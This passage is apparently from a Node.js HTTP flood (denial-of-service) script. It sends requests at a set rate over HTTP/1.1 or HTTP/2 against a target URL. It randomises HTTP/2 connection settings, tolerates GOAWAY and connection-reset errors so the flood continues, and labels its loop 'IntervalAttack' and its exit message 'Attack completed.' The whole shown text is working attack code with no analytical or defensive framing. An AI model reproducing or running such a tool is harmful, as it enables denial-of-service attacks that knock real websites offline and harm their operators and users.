          }
        });
        
        req.on('error', (error) => {
          if (args.debug) {
            console.log(`[DEBUG] HTTP/1.1 Request error: ${error.message}`);
          }
        });
        
        if (args.method === 'POST' && args.postData) {
          req.write(args.postData);
        }
        
        req.end();
      };
      
      const intervalId = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          performRequest();
        }
      }, interval);
      
      tlsConn.on('error', (error) => {
        if (args.debug) {
          console.log(`[DEBUG] TLS Connection error: ${error.message}`);
        }
        clearInterval(intervalId);
        tlsConn.destroy();
        connection.destroy();
      });
      
    } else {
      if (args.debug) {
        console.log('[DEBUG] Using HTTP/2');
      }
      
      function generateRandomSettings() {
        return {
          headerTableSize: Math.floor(Math.random() * (65536 - 16384 + 1)) + 16384,
          maxConcurrentStreams: Math.floor(Math.random() * (1000000 - 100 + 1)) + 100,
          initialWindowSize: Math.floor(Math.random() * (16777216 - 1048576 + 1)) + 1048576,
          maxHeaderListSize: Math.floor(Math.random() * (262144 - 16384 + 1)) + 16384,
          enablePush: Math.random() < 0.5
        };
      }

      const randomSettings1 = generateRandomSettings();

      client = http2.connect(parsedTarget.href, {
        protocol: "https:",
        settings: randomSettings1,
        maxSessionMemory: 64000,
        maxDeflateDynamicTableSize: 4294967295,
        createConnection: () => tlsConn,
        socket: connection,
      });

      const randomSettings2 = generateRandomSettings();

      client.settings(randomSettings2);

      client.setMaxListeners(0);
      client.settings(settings);
      
      client.on("connect", () => {
        const IntervalAttack = setInterval(() => {
          for (let i = 0; i < args.Rate; i++) {
            const requestHeaders = buildHeaders(parsedTarget);
            
            const request = client.request(requestHeaders)
              .on("response", response => {
                if (args.debug) {
                  console.log(`[DEBUG] HTTP/2 Response: ${response[':status']}`);
                }
                request.close();
                request.destroy();
                return;
              });
              
            if (args.method === 'POST' && args.postData) {
              request.write(args.postData);
            }
            
            request.end();
          }
        }, interval);
        
        setTimeout(() => {
          clearInterval(IntervalAttack);
          client.destroy();
          tlsConn.destroy();
          connection.destroy();
        }, args.time * 1000);
      });

      client.on("close", () => {
        client.destroy();
        tlsConn.destroy();
        connection.destroy();
        return;
      });
      
      client.on("timeout", () => {
        client.destroy();
        tlsConn.destroy();
        connection.destroy();
        return;
      });
      
      client.on("error", (error) => {
        if (args.debug) {
          console.log(`[DEBUG] HTTP/2 Client error: ${error.message}`);
        }
        
        if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
          if (args.debug) {
            console.log('[DEBUG] Received GOAWAY error, pausing requests for 2 seconds');
          }
          setTimeout(() => {
            if (args.debug) {
              console.log('[DEBUG] Resuming requests after pause');
            }
          }, 2000);
        } else if (error.code === 'ECONNRESET') {
          if (args.debug) {
            console.log('[DEBUG] Connection reset, pausing requests for 5 seconds');
          }
          setTimeout(() => {
            if (args.debug) {
              console.log('[DEBUG] Resuming requests after pause');
            }
          }, 5000);
        } else {
          const statusCode = error.response ? error.response.statusCode : null;
          if (statusCode >= 520 && statusCode <= 529) {
            if (args.debug) {
              console.log(`[DEBUG] Server error ${statusCode}, pausing requests for 2 seconds`);
            }
            setTimeout(() => {
              if (args.debug) {
                console.log('[DEBUG] Resuming requests after pause');
              }
            }, 2000);
          } else if (statusCode >= 531 && statusCode <= 539) {
            if (args.debug) {
              console.log(`[DEBUG] Server error ${statusCode}, pausing requests for 2 seconds`);
            }
            setTimeout(() => {
              if (args.debug) {
                console.log('[DEBUG] Resuming requests after pause');
              }
            }, 2000);
          }
        }
        
        client.destroy();
        tlsConn.destroy();
        connection.destroy();
      });
    }
  });
}

const StopScript = () => {
  console.log("\nAttack completed.".green);
  process.exit(0);
};

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {
  if (args.debug) {
    console.log(`[DEBUG] Uncaught exception: ${error.message}`);
  }
});

process.on('unhandledRejection', error => {
  if (args.debug) {
    console.log(`[DEBUG] Unhandled rejection: ${error.message}`);
  }
});
